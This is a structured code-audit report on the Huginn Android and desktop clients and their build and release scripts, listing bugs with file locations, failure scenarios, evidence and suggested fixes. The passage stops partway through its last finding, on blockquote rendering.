### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/Shell.kt:701`

Both rename dialogs are mouse-only: the text field takes no initial focus and Enter does not confirm, so renaming needs click-into-field, type, click-Rename — in a client that otherwise ships a full keyboard model and cheat sheet.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** Owner presses Rename from a right-click menu, starts typing -> keystrokes go nowhere until the field is clicked; after typing, Enter does nothing and the hand must return to the mouse for the Rename button. Repeated for every chat/session rename.

<details><summary>Evidence</summary>

```
Shell.kt:695-712 DialogField is a `BasicTextField(..., singleLine = true)` with no FocusRequester and no onPreviewKeyEvent; singleLine only filters the newline out of the value, it does not submit, and no KeyboardActions/onDone is wired to onConfirm. Same in ChatTopBar.kt:117-122 (OutlinedTextField, no focus request, no Enter handling). Compare Shortcuts.kt/SHORTCUT_HELP which documents keyboard routes for everything else.
```

</details>

**Suggested fix:** Add a FocusRequester + LaunchedEffect(Unit){requestFocus()} to DialogField and an onPreviewKeyEvent (Enter -> onConfirm when `ok`, Escape -> onDismiss); do the same in ChatTopBar or, better, delete its private dialogs per the unification finding.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/StatusView.kt:40`

Desktop Status omits MemPalace health, extra-usage/spend-limit and today's cost/cache-read figures that the phone shows, hiding two states the owner actually acts on (memory daemon down; spend limit reached).

**lane** feature parity, phone vs desktop · **verdict** not separately verified

**What goes wrong:** MemPalace write daemon dies (has happened — the 2026-07-19 lease workaround exists because of it): phone Status shows 'write daemon down' in red, desktop Status shows all green; owner at the desktop concludes the host is healthy. Same for extra-usage 'spend limit reached', which is the number that stops work.

<details><summary>Evidence</summary>

```
StatusView.kt:40-48 renders host/appd/claude/uptime/load/disk/sessions/chats only — no `status.mempalace` although core Models.kt:29 carries it and the phone renders it with color coding (StatusScreen.kt:104-117 'write daemon down'/'not reachable' in error color); StatusView.kt:72-83 usage section has no plan.extraUsage (phone StatusScreen.kt:184-193 shows '(limit reached)') and no cost/cache lines.
```

</details>

**Suggested fix:** Add Field('mempalace', ...) with the phone's wording map to the Host section and an extra-usage line to the Plan section; both are already decoded in :core models.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/TermKeys.kt:101`

Compose desktop's key mapper produces no M-<letter> chords and no F-keys, both of which the daemon accepts and the Electron client it replaced sent — and on Linux an Alt+letter falls through to the code-point branch and lands as the literal letter.

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **verdict** not separately verified

**What goes wrong:** Owner drops a session pane to a shell and uses readline muscle memory in Live mode on the Compose desktop: Alt+. (yank last arg) or Alt+b/Alt+f do nothing on Windows and insert a stray '.'/'b'/'f' into the command line on Linux — where the same keys worked on the Electron client.

<details><summary>Evidence</summary>

```
named() maps only Enter/BSpace/Tab/BTab/Escape/arrows/Home/End/PPage/NPage/DC/IC; of() has an isCtrlPressed branch but no isAltPressed branch and no F-key mapping. Server validKey (huginn-appd.js:631) accepts `/^M-[a-z]$/` and `/^F([1-9]|1[0-2])$/`; Electron keymap.ts:41-47 sent both (`if (e.altKey) ... opKeys(\`M-${k}\`)`; `if (/^F([1-9]|1[0-2])$/.test(e.key)) return opKeys(e.key)`). With Alt held, AWT's keyChar on Linux is commonly the plain letter, which passes typable() and is sent as text.
```

</details>

**Suggested fix:** Add an isAltPressed branch mapping letters to M-<letter> (mirroring the Ctrl branch) and map Key.F1..F12 to F1..F12 in named().

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/ui/session/WorkPanel.kt:65`

AgentsPoll swallows every fetch failure, so an open work-detail panel that cannot reach the daemon shows the loading sentence 'Agents…' forever — a failure drawn as loading, with no error surface.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** Owner opens the strip's detail mid fan-out while the route is down (laptop asleep, VPN blip): the panel shows 'Agents…' indefinitely, retrying silently every 3s, indistinguishable from a slow first read — the same loading-vs-error conflation class as the transcript bug.

<details><summary>Evidence</summary>

```
WorkPanel.kt:65 `runCatching { client.sessionAgents(name) }.onSuccess { _agents.value = it }` — no onFailure branch, `_agents` stays null; WorkDetail (ui/work/WorkViews.kt:170) renders `SectionHeading(WorkSummary.agentCount(agents, statusLines) ?: "Agents…")` whenever agents==null. The phone's WorkSheet has the identical shape (SessionScreen.kt:621 `agents == null -> "Agents…"`).
```

</details>

**Suggested fix:** On failure after N attempts set a distinct message through the flow (e.g. 'Could not read agents: <err>') or expose an error StateFlow the panel renders under the heading.

### `mobile/app-desktop/src/main/kotlin/com/silencelen/huginn/desktop/update/UpdateHttp.kt:100`

The updater's final swap uses File.renameTo and ignores delete()'s result — the exact platform-dependent primitive that C10 bans and that cost the owner his token, at the one call site whose output is an executable.

**lane** :app-desktop (Compose Desktop shell) — correctness, security, lifecycle · **contract** C10 · **verdict** not separately verified

**What goes wrong:** On Windows a previous Huginn-Desktop-Setup-0.3.2.exe is still in %LOCALAPPDATA%\..\huginn-desktop-kt\updates and is open by Defender or SmartScreen (or simply by a shell preview handler). `dest.delete()` returns false and is ignored; `part.renameTo(dest)` then returns false because the destination exists; `check` throws; the pass reports "download failed: could not move Huginn-Desktop-Setup-0.3.2.exe.part into place". The 96 MB is re-downloaded on the next pass, which hits the same lock, and the client sits in a re-download loop over the tailnet reporting a failed update the owner cannot act on.

<details><summary>Evidence</summary>

```
UpdateHttp.kt:99-100, the last two lines of download():

  if (dest.exists()) dest.delete()
  check(part.renameTo(dest)) { "could not move ${'$'}{part.name} into place" }

`dest.delete()`'s boolean is discarded, and `renameTo` is the call DesktopSettings.kt:378-391 documents at length as the token-wipe cause: "THIS COST THE OWNER HIS TOKEN. `File.renameTo` is documented as platform dependent and on Windows it does NOT replace an existing destination — it simply returns false... `Files.move(REPLACE_EXISTING)` is correct on both." DesktopSettings.save (lines 392-412) was converted to `Files.move(..., REPLACE_EXISTING, ATOMIC_MOVE)` with an AtomicMoveNotSupportedException fallback; this call site was not.

It is LOW rather than a repeat of the original because the result IS checked here (`check(...)` throws) and the caller reports it — DesktopUpdater.kt:196-202 wraps the download in `runCatching { ... }.getOrElse { return fail("download failed: ${'$'}{it.message}") }`. So the failure is loud, not silent. What it costs is the download.
```

</details>

**Suggested fix:** Use the same call the settings writer uses: `Files.move(part.toPath(), dest.toPath(), REPLACE_EXISTING)` (ATOMIC_MOVE is not needed here — same directory, and a torn artifact is caught by the sha256 gate), inside a try that falls back to delete+move and reports which step failed. Delete the orphan `.part` on failure so the next pass starts clean.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/MainActivity.kt:192`

Every app-lock cycle discards navigation state: swapping HuginnApp out for LockedScreen removes it from composition, so its rememberSaveable dest/tab are lost and unlock always lands on the Sessions list.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **verdict** not separately verified

**What goes wrong:** Owner (app lock on) is reading a session, switches to a browser for >60s, comes back, unlocks — and is on the Sessions list instead of the session he was reading, on every single return past the grace window. Drafts survive (VM) but the place does not, undercutting the same 'unfolding is not a retraction' care taken elsewhere.

<details><summary>Evidence</summary>

```
`if (locked.value) { LockedScreen(...) } else { HuginnApp(...) }` — conditional composition, no SaveableStateHolder. rememberSaveable values are discarded when their composable permanently leaves composition within a live activity; only activity recreation (the fold/rotate case the code comments defend against) restores them. So dest (rememberSaveable at line 389) resets to Dest.Sessions and tab to 1 on every lock→unlock.
```

</details>

**Suggested fix:** Keep HuginnApp composed underneath and overlay LockedScreen (FLAG_SECURE already guards Recents), or hoist dest/tab into the ViewModel/activity so they survive the swap.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/data/SettingsStore.kt:66`

clientId() is a non-atomic check-then-mint: two concurrent first callers (e.g. heartbeat receiver and worker on a fresh install) can mint different UUIDs, registering a phantom client on the host before the id settles.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **contract** C10 · **verdict** not separately verified

**What goes wrong:** First launch: worker and heartbeat both run before either write lands → two ids are handed to the daemon in watch requests → the host's clients registry shows two phones for one install; one id is then orphaned forever (delivery-health rows and pushesSent tallies attach to the wrong client).

<details><summary>Evidence</summary>

```
`val existing = context.dataStore.data.map { it[CLIENT_ID] }.first(); if (!existing.isNullOrBlank()) return existing; val minted = UUID.randomUUID(); context.dataStore.edit { it[CLIENT_ID] = minted }` — the read is outside the edit, and dataStore.edit unconditionally overwrites. HeartbeatReceiver.tick, SessionWatchWorker.doWork, and the VM init all call clientId() independently.
```

</details>

**Suggested fix:** Mint inside the transform: edit { prefs -> prefs[CLIENT_ID] ?: run { prefs[CLIENT_ID] = UUID... } } and return the stored value.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/notify/ReplyReceiver.kt:41`

A whitespace-only inline reply returns without re-posting the notification, leaving the RemoteInput action stuck showing the system's indefinite progress spinner (the comment claims a restore that the code does not perform).

**lane** :app (Android shell) — correctness, lifecycle, notifications · **verdict** not separately verified

**What goes wrong:** Owner taps Reply on a finished-chat notification, the keyboard inserts a stray space, send → trim yields empty → receiver returns; the notification's Reply button sits on a spinner until the notification is swiped away or the next chat_finished replaces it.

<details><summary>Evidence</summary>

```
`if (text.isEmpty()) return` after trim — no notify() call on this path. Android keeps the reply action in its in-progress state until the app updates the notification carrying the RemoteInput; the comment above ('Restoring the notification rather than leaving the shade half-collapsed keeps the reply box reachable') describes behavior that is not implemented.
```

</details>

**Suggested fix:** On the empty path, re-notify with the recovered thread unchanged (the update() helper already does exactly this) before returning.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/HuginnViewModel.kt:73`

The C5 seed-XOR-replay reattach rule is implemented twice — reattachPlan in :app and reattachFlow in :app-desktop ChatController.kt:197 — with no shared copy in :core, so the exact rule whose divergence historically doubled an answer is free to drift between clients.

**lane** :core — HuginnClient.kt, HTTP/SSE, reattach, timeouts, models · **contract** C1 · **verdict** not separately verified

**What goes wrong:** A future fix to one copy (e.g. handling running=true with seq present but partialText null, or clamping since to the replay-buffer floor) lands in :app only; the desktop keeps the old behaviour and reattaching to a running chat renders the answer doubled again on that client only — invisible to :core tests because :core holds no implementation to test.

<details><summary>Evidence</summary>

```
grep shows reattachPlan only in app/.../HuginnViewModel.kt (+ its test); desktop ChatController.kt:197-207 re-implements the same rule inline: `val seq = d.seq; return if (seq != null) { _partial.value = d.partialText ?: ""; client.streamChat(chatId, since = seq) } else { _partial.value = ""; client.streamChat(chatId, since = 0) }`. ChatController's own comment concedes the risk: 'It was written twice first, and the second copy is exactly where a double-rendered answer would come from.' Not in the known task #20 list (that covers WorkStrip/model-label/scroll duplicates).
```

</details>

**Suggested fix:** Hoist one `fun reattachPlan(meta: ChatDetail?): Reattach?` into :core/data beside HuginnClient (the C5 reference), move ReattachPlanTest to :core commonTest, and have both HuginnViewModel.attachIfRunning and ChatController.reattachFlow consume it.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/HuginnViewModel.kt:963`

The session-name rule exists in three hand-kept shell copies and they have diverged: phone CREATE rejects dots/dashes that the daemon and the desktop accept, and the phone's rename dialog silently rewrites '-' and '.' to '_' before the (correct) validator can see them.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** PARTLY_TRUE (PARTLY_TRUE:1) · **severity** MED → LOW

**What goes wrong:** Owner creates 'audit-run' on the desktop (accepted, daemon addresses it fine), then tries to create a sibling 'audit-run2' on the phone: rejected with 'letters, digits and underscore only'. Or renames 'build' to 'build.v2' in the phone dialog: it silently becomes 'build_v2' with no warning, and the session the owner looks for later does not exist under the name they typed.

<details><summary>Evidence</summary>

```
Phone create HuginnViewModel.kt:963: `Regex("^[a-z0-9_]{1,50}$")` (no dot/dash). Phone rename HuginnViewModel.kt:991: `^[a-z0-9_][a-z0-9_.-]{0,49}$` (matches daemon). Phone rename DIALOG MainActivity.kt:663: `renameText.trim().lowercase().replace(Regex("[^a-z0-9_]"), "_")` — squashes dots/dashes before calling renameSession, making the correct rule at :991 unreachable from the UI. Desktop Shell.kt:762: `private val SESSION_NAME = Regex("^[a-z0-9_][a-z0-9_.-]{0,49}$")` with the comment "kept in step with the phone's copy of it" — an admission of hand-sync. Daemon huginn-appd.js:225: `NAME_RE = /^[A-Za-z0-9_][A-Za-z0-9_.-]{0,49}$/`.
```

</details>

**Verifier's correction:** Two corrections. (a) The correct rename validator at HuginnViewModel.kt:991 is NOT unreachable from the UI — SessionsScreen.kt:141's rename dialog calls vm.renameSession with the raw text; only MainActivity.kt:663's surface-menu dialog pre-squashes, so this is four copies and a narrower fix. (b) The 'build.v2' scenario is wrong about which client misbehaves: tmux itself rewrites '.' to '_' in session names (proved live), so the phone's sanitizer accidentally yields the name that exists while the daemon/desktop path is the one that reports a dotted name tmux never created. The surviving, provable divergence is dashes plus the phone's create-side rejection of names the daemon and desktop accept. Severity MED -> LOW.

**Suggested fix:** Move one SessionName rule (regex + canonicalize) into :core next to AppdRoutes, use it from both shells for create AND rename, and delete the MainActivity pre-sanitizer (validate + toast instead of silently rewriting).

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionControls.kt:44`

Task #20 confirmed still fully open: every named phone duplicate still exists; the ModelLabels and Follow clusters have NOT diverged (verified line-for-line equivalent today) and are a mechanical swap, but the Work cluster HAS diverged (see the two MED findings) and its swap is not mechanical.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Every future fix to follow-scroll, model labels, or the work strip lands in one client only unless someone remembers both copies — which is precisely how the two MED divergences above already happened (linger and server-clock fixes shipped to :ui/:core with the desktop and never reached the phone).

<details><summary>Evidence</summary>

```
Still present in :app: FALLBACK_MODELS (SessionControls.kt:44), prettyEffort:176 / modelOptions:179 / prettyModel:190 — semantically identical to :core ModelLabels.kt:17/27/38/40 (same fallback list 'fable/opus/sonnet/haiku', same 'must NOT collapse to a family name' rule). AutoScrollToNewest (Common.kt:72), jumpToTail:150, JumpToNewest:163 — logic identical to :ui Follow.kt FollowNewest:62/scrollToNewest:135/NewestPill:148 (same latch, same isAtTail slack 48px, same scrollBy(1_000_000f)); Follow.kt's own doc says ':app's copy in ui/Common.kt is the one to delete'. WorkStrip:432/plannedAgents:518/WorkSheet:535/AgentRow:635 still shadow :ui WorkViews + :core TranscriptGroups.plannedAgents:96 (regexes identical; ran `diff` on the two PlannedAgentsTest files — only imports/JUnit-vs-kotlin.test and comments differ). Also in the cluster: phone PulsingDot/StateDot vs :ui PulseDot/SettledDot, private agoShort (SessionScreen.kt:502) vs WorkSummary.agoShort (identical).
```

</details>

**Suggested fix:** ModelLabels + Follow swaps are mechanical (same package `com.silencelen.huginn.ui`, rename ~6 call sites, delete ~200 lines). The Work cluster swap additionally needs phone-side lastWorkAt/clock ticker state (mirror or share desktop WorkPanel.kt:124-145) and a scroll container around WorkDetail (it emits a plain Column; the phone sheet used LazyColumn) — small, but not a pure rename.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionControls.kt:122`

The phone's chat model/effort pickers offer no 'Host default' entry, so a chat's model/effort can never be cleared back to default from the phone — while the desktop twin can (empty-string CLEAR), and the daemon supports it.

**lane** protocol contract drift — what clients SEND vs what appd ACCEPTS · **contract** C1 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner sets a chat to effort=max on the phone to push through a hard question; wants the default back afterwards — the phone offers only the five levels, so the chat burns max effort on every later turn until he finds the desktop client.

<details><summary>Evidence</summary>

```
Phone ChatOptionsBar: `options = modelOptions(models)` and `options = EFFORTS.map {...}` — no clear entry, though the label says "Default model"/"Default effort" when null. Desktop twin ChatOptionsRow.kt:64/71 appends `+ (CLEAR to "Host default")` with `private const val CLEAR = ""` (line 84). HuginnClient.updateChat omits null (`if (model != null)`), so null can't be sent either. RAN IT: PATCH {"model":"","effort":""} on a scratch chat against live daemon → both fields null (cleared) — the server-side path works; the phone just can't reach it.
```

</details>

**Suggested fix:** Append the same ("" to "Host default") entry to the phone's two pickers — or delete the phone's private ChatOptionsBar copies per open task #20 and share the row.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/SessionScreen.kt:669`

The phone's private AgentRow timestamps agents with the DEVICE clock (relTime/System.currentTimeMillis) while the shared AgentCard uses the server's clock (AgentsInfo.serverTime via WorkSummary.sinceShort) — a diverged duplicate that reintroduces the clock-skew bug the shared code was written to fix.

**lane** KMP layering contract and shell-level duplication (C1) · **contract** C1 · **verdict** CONFIRMED (CONFIRMED:1) · **severity** MED → LOW

**What goes wrong:** Phone clock 90s fast: every actively-writing agent in the phone's WorkSheet reads '1m' stale while the desktop says 'now' for the same agents; phone clock slow: settled agents read as writing right now. Two clients, same data, different liveness story.

<details><summary>Evidence</summary>

```
SessionScreen.kt:669 `relTime(a.updatedAt)` where Common.kt:239 computes `System.currentTimeMillis() / 1000 - epochSec`. Shared :ui WorkViews.kt AgentCard uses `WorkSummary.sinceShort(a.updatedAt, nowSec)` with `val nowSec = agents?.serverTime ?: 0L`, whose doc says: "a client whose clock is a minute out would otherwise report a live agent as stale, or a settled one as writing right now." Also diverged cosmetically: phone closing line maxLines=2 vs shared 3 (WorkViews.kt:247), and phone renders a blank task row when the task is only 'CONTEXT:' where shared WorkSummary.taskLine() returns null.
```

</details>

**Verifier's correction:** The defect is real, but the stated failure scenario (a phone clock 90s out) requires the user to have turned off Android's automatic network time; the unconditional harm is the duplicated/diverged code, the blank task row when the task is only 'CONTEXT:', and maxLines 2 vs 3. Severity MED -> LOW.

**Suggested fix:** Replace AgentRow with the shared AgentCard(a, agents.serverTime) when doing the task #20 swap; delete relTime usage for agent rows.

### `mobile/app/src/main/kotlin/com/silencelen/huginn/ui/TerminalScreen.kt:136`

After the Screen tab is visited once, the phone keeps sending its cols/rows on every screen poll while the user sits on the Conversation tab, renewing the server-side size lease for a grid nobody is looking at.

**lane** :app (Android shell) — correctness, lifecycle, notifications · **contract** C6 · **verdict** not separately verified

**What goes wrong:** Owner peeks at the Screen tab of a session an attached laptop is using, taps back to Conversation and reads there for ten minutes — the laptop's window stays pinned at phone geometry the whole time, though the phone stopped rendering the grid after the first ten seconds. C6 names 'tab switch away' as a release point.

<details><summary>Evidence</summary>

```
`LaunchedEffect(cols, rows) { onGeometry(cols, rows) }` sets wantCols/wantRows in the VM; they are cleared only in stopScreenPolling (HuginnViewModel.kt:1141-1142), which runs on leaving the session view or backgrounding — not on switching Screen→Conversation within the session (tab switch recomposes SessionScreen's Box content only). Every subsequent long poll passes cols/rows (HuginnViewModel.kt:1085-1093), which is what renews the lease server-side.
```

</details>

**Suggested fix:** Null wantCols/wantRows (without killing the poll) when tab != Screen, or make the Screen composable own the geometry claim the way the WorkSheet owns its poll.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/HuginnClient.kt:229`

probe() swallows CancellationException (runCatching -> getOrDefault(false)), so cancelling a route resolution mislabels every remaining candidate unreachable instead of propagating cancellation — the exact pattern sse() and watchStream carefully avoid two hundred lines later.

**lane** :core — HuginnClient.kt, HTTP/SSE, reattach, timeouts, models · **verdict** not separately verified

**What goes wrong:** The resolving coroutine is cancelled (scope teardown today; any future withTimeout/collectLatest wrapper) while probing candidate 1 -> the CancellationException is converted to `false`, the loop 'probes' the remaining candidates (each instantly false for the same reason), resolve() returns null, and the caller acts on a fabricated 'nothing reachable' conclusion — on the phone, setting the no-route toast state — instead of the coroutine simply stopping.

<details><summary>Evidence</summary>

```
`suspend fun probe(candidate: String): Boolean = runCatching { http.request { ... }; true }.getOrDefault(false)` — no CancellationException rethrow, unlike sse()/watchStream which both have `catch (e: CancellationException) { throw e }`. RouteResolver.resolve loops candidates calling probe; phone resolveRoute then does `found == null -> _toast.value = "No route to huginn — is a VPN connected?"` (HuginnViewModel.kt:598-600).
```

</details>

**Suggested fix:** In probe(), catch CancellationException and rethrow before the getOrDefault (or use try/catch on specific IO exceptions): `runCatching{...}.onFailure { if (it is CancellationException) throw it }.getOrDefault(false)`.

### `mobile/core/src/commonMain/kotlin/com/silencelen/huginn/data/HuginnClient.kt:479`

Session names are interpolated into URL paths without percent-encoding and the daemon never decodes the captured segment, so a tmux session whose name contains a space (or %, #) is listed by /v1/sessions but permanently unopenable, unkillable and unrenameable from both clients.

**lane** :core — HuginnClient.kt, HTTP/SSE, reattach, timeouts, models · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** Owner runs `tmux new -s "db restore"` on huginn; the phone and desktop list 'db restore' as a session, but opening it yields 404 'no such session' on every poll, and kill/rename from the app fail the same way — a list entry that can never be opened or removed except from a terminal.

<details><summary>Evidence</summary>

```
Client builds `"/v1/sessions/$name/screen"` (also killSession:448, renameSession:452, sendKeys:547, transcript:535, agents:532, releaseSize:486, answer:293) with raw `$name`, while uploadQuery(:524) shows the codebase does encode elsewhere (`it.encodeURLParameter()`). Daemon: `const p = u.pathname.replace(...)` (huginn-appd.js:2030) with no decodeURIComponent on session routes (only the /v1/desktop artifact routes decode, lines 2845/2858). Demonstrated live: created my own tmux session 'audit-sp ace' (killed after); scratch appd listed it in GET /v1/sessions, but GET /v1/sessions/audit-sp%20ace/screen -> 404 and a raw-space request line is invalid HTTP. The daemon's own POST /v1/sessions validates 'letters, digits, underscore' (line 2543), so only owner/tool-created tmux names hit this.
```

</details>

**Suggested fix:** Percent-encode the path segment in HuginnClient (e.g. a `private fun seg(s: String) = s.encodeURLParameter()` used by every /v1/sessions/<name> builder) AND decodeURIComponent the captured segment in the daemon's session routes — both sides together, or names containing % break asymmetrically.

### `mobile/scripts/build.sh:70`

The Kotlin test floor is 90 tests below the actual count and double-counts :core, so the entire :app suite could shrink from 49 tests to 1 and the gate would still pass; :app-desktop's 188 tests are not gated by build.sh at all.

**lane** test coverage map — find the next TermKeys · **contract** C11 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A refactor moves 40 tests out of :app into :core and one of them is accidentally dropped in the move. New counts: core 273+273, app 9, ui 7 = 562 >= 432, every dir > 0, gate green. Or, more simply, someone deletes an :app test class of 48 tests to unblock a build: 233+233+1+7 = 474 >= 432, still green. The floor only detects total collapse, not the loss of most of a module.

<details><summary>Evidence</summary>

```
build.sh:70 `KOTLIN_MIN=432   # 188 (:core jvm) + 188 (:core android) + 49 (:app) + 7 (:ui jvm), 2026-07-30`. RAN (XML parse, current HEAD): core/jvmTest=233, core/testDebugUnitTest=233, app/testDebugUnitTest=49, ui/jvmTest=7 -> KOTLIN_COUNT=522, floor 432, slack 90. The per-dir guard is only `[ "${N:-0}" -gt 0 ]`, so any single module may collapse to one test. :core is counted twice (the same 23 classes run against two targets), which means half the floor is satisfied by one module and the floor cannot express "each module still has its suite". build.sh:58 runs `:core:jvmTest :core:testDebugUnitTest :app:testDebugUnitTest :ui:jvmTest` — `:app-desktop:test` (188 tests, 24 classes) is neither run nor counted here; only release-desktop.sh:118-122 includes it.
```

</details>

**Suggested fix:** Make the floor per-module rather than aggregate — a small associative list of `dir:min` checked in the loop — and record :core once (assert the two targets are EQUAL to each other, which also catches a target silently losing sources, rather than summing them). Add :app-desktop to build.sh's list or state in the header why the desktop suite is release-only.

### `mobile/scripts/build.sh:89`

The appd test gate is wrapped in `if command -v node`, so a machine without node in PATH silently skips the entire server suite — the exact green-over-red shape the five lines above it were rewritten to remove.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **contract** C11 · **verdict** not separately verified

**What goes wrong:** build.sh (directly, or via ship.sh) is run from a shell whose PATH lacks the node install — a cron/systemd unit with a minimal PATH, an nvm shell where the default alias is unset, or a container image built without node. The 385-test appd suite never runs, no line is printed saying so, and a signed release APK is shipped to devstore against a daemon whose pane parsing / prompt detection / transcript reading was never exercised.

<details><summary>Evidence</summary>

```
Lines 84-88 make a moved directory a hard error, with the reason stated: "an -d guard here once meant a moved directory would turn this gate green while testing nothing." Then line 89: `if command -v node >/dev/null 2>&1; then` ... and the closing `fi` at line 98 has no `else`. A missing node produces no output and no non-zero exit; the script proceeds straight to `[build 2/3]`.
By contrast release-desktop.sh:133-141 runs `node --test` unconditionally.
```

</details>

**Suggested fix:** Drop the `command -v` guard and let a missing node be a hard failure, matching the directory check directly above it and release-desktop.sh's unconditional call: `command -v node >/dev/null || { echo "[build] node not found — refusing." >&2; exit 1; }`.

### `mobile/scripts/release-desktop.sh:273`

The desktop release script's wine verification deletes the probe's settings file, so every release mints a brand-new client identity that registers with the daemon as a real notification-capable client; /v1/clients now holds 15 dead desktop entries.

**lane** documentation drift and deployed-state drift · **contract** C7 · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** During the ~3 minutes after a release build's wine probe, `appOnline()` (clients.js:75-81) sees a fresh `kind=stream, notify=true` client and returns true, so an alert fired in that window is judged already-delivered and the household Telegram fallback is suppressed — for a client that is a throwaway JVM under Xvfb that nobody can see. Separately, the diagnostic clients.js exists for ("did my phone keep checking in overnight?") is now unreadable for desktop: 15 of 18 rows are build artifacts.

<details><summary>Evidence</summary>

```
release-desktop.sh:272-276:
```
    PROBE_HOME="$WINEPREFIX/drive_c/users/$(id -un)/.config/huginn-desktop-kt"
    rm -f "$PROBE_HOME/settings.json"
    ( cd "$INSTALLED" && timeout 120 xvfb-run -a -s "-screen 0 1400x900x24" \
        wine ./huginn-desktop-kt.exe >> "$LOG" 2>&1 & )
```
DesktopSettings.kt:142 `if (stored.clientId.isEmpty()) mutate { it.copy(clientId = "desktop-kt-${UUID.randomUUID()}") }` — deleting the settings file therefore forces a new id.
Live `GET /v1/clients` returns 18 entries, 15 of them dead desktop probes, 11 with `notify=true`:
```
desktop-kt-c88942bf-... kind=stream fresh=false age=397089 notify=true
desktop-kt-6cd28d11-... kind=stream fresh=false age=397836 notify=true
... (9 more) ...
desktop-kt-verify-scratch  kind=stream fresh=false age=142394 notify=false
```
clients.js:52 documents the intended shape: "@param id  stable per-installation id sent by the app". pruneClients (clients.js:102, FORGET_MS = 7 days) is called (huginn-appd.js:1446) but cannot help inside the window.
```

</details>

**Suggested fix:** Give the probe a fixed, non-notifying identity — seed `$PROBE_HOME/settings.json` with `clientId: "desktop-kt-release-probe"` and notify disabled instead of deleting the file (the launch proof can then be the file's mtime changing, or any other file the app writes). Optionally have the daemon ignore check-ins whose ua/clientId marks them as a probe.

### `mobile/scripts/release-desktop.sh:316`

The desktop manifest's release notes are hard-truncated at 2000 characters with no ellipsis, so the notes the client shows for 0.3.1 end mid-word.

**lane** documentation drift and deployed-state drift · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** A user opens the desktop client's update prompt for 0.3.1 and reads release notes that stop mid-sentence — and the truncation lands inside the third of four fixes, so the last item ("the lost draft" / whatever followed) is never shown at all. Every future release whose changelog section exceeds 2000 chars does the same.

<details><summary>Evidence</summary>

```
mobile/scripts/release-desktop.sh:316: `if (m) man.notes = m.split(/\n## /)[0].trim().slice(0, 2000)`.
Measured against the live channel:
```
$ node -e "const m=require('/var/lib/huginn-appd/desktop-kt/manifest.json');console.log('notes length',m.notes.length);console.log('tail:',JSON.stringify(m.notes.slice(-60)))"
notes length 2000
tail: " to close, and — because this app hides to the tray rather t"
```
The 0.3.1 changelog section is longer than 2000 chars, so the served notes stop inside the word "rather than".
```

</details>

**Suggested fix:** Either raise the cap, or truncate on a paragraph boundary and append a marker, e.g. slice to the last `\n\n` before 2000 and add "\n\n(...full notes in CHANGELOG.md)" — the full CHANGELOG.md is already staged into the same channel directory.

### `mobile/scripts/ship.sh:48`

Nothing ever prunes mobile/dist: every build leaves a uniquely-named APK behind and the directory is now 1.5 GB on a root filesystem at 81%.

**lane** packaging and release — mobile/scripts/{build,ship,release-desktop}.sh, app-desktop/packaging/huginn-desktop-kt.nsi, app-desktop/build.gradle.kts (packaging config), desktop/scripts/release.sh + electron-builder.yml · **verdict** not separately verified · **demonstrated by running it**

**What goes wrong:** At ~52 MB per build and several builds per working session, dist/ grows unbounded on a root filesystem with 12 GB free that also hosts /opt/huginn, /var/lib/huginn-appd (368 MB of desktop-kt + 586 MB of desktop channel artifacts), the wine prefix and the Windows JDK. Around 230 more APKs — reachable in a few months at the current cadence — the release scripts themselves start failing mid-stage with ENOSPC, and release-desktop.sh's staging step is the place that would fail: `install -m 644 "$f" "$CHANNEL_DIR/$b.tmp"` writes a 96 MB file into the same filesystem right before it renames the manifest over the live one.

<details><summary>Evidence</summary>

```
app/build.gradle.kts:182 `val renamed = "Huginn-$variant-$vc-$ts.apk"` where $vc is seconds-since-2026 and $ts is a unix timestamp — every single build produces a NEW filename in dist/, and neither build.sh nor ship.sh deletes anything (contrast release-desktop.sh, which has an explicit KEEP=2 prune for the desktop channel).
RAN: `ls -1 /opt/huginn/mobile/dist/*.apk | wc -l` -> 29; `du -sh /opt/huginn/mobile/dist` -> 1.5G; `df -h /` -> 59G total, 45G used, 12G avail, 81%.
dist/*.apk is gitignored, so this is pure local accumulation nothing else reclaims.
```

</details>

**Suggested fix:** Add a keep-N prune to build.sh (or ship.sh step 2) mirroring the desktop scripts: after the manifest is written, delete all but the newest N `Huginn-<variant>-*.apk` in dist/ per variant. Reclaim the current 1.5 GB now.

### `mobile/ui/src/commonMain/kotlin/com/silencelen/huginn/ui/MarkdownText.kt:95`

A blockquote's left mark is a fixed 2x18dp box, so any quote that wraps past one line shows the mark on the first line only and the rest reads as an unmarked paragraph.

**lane** :ui shared composables — usability, state latches, and owner taste · **verdict** not separately verified

**What goes wrong:** Claude quotes a two-sentence passage; on a phone width it wraps to 3 lines, the 18dp mark covers line one, and lines two/three are indistinguishable from body text — the 'punctuation' loses the very thing it marks.

<details><summary>Evidence</summary>

```
